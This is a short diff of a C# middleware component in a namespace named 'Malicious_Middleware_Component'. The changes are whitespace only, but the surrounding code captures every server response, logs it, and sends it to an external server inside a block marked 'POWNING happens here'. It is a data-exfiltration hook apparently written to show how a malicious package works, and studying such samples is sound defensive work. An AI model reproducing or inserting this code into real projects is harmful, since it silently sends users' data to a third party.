@@ -48,12 +48,12 @@ namespace Malicious_Middleware_Component
 
             //Format the response from the server
             var response = await GetResponseAsTextAsync(context.Response);
+
             //Log it
             _logger.LogInformation(response);
 
 
             //POWNING happens here
-            
             //Send the request to external server
             if (!string.IsNullOrEmpty(response))
             {
@@ -66,8 +66,6 @@ namespace Malicious_Middleware_Component
                     MediaTypeHeaderValue.Parse("application/x-www-form-urlencoded");
                 await httpClient.SendAsync(httpRequest);
             }
-            
-
             //POWNING ends here
 
 
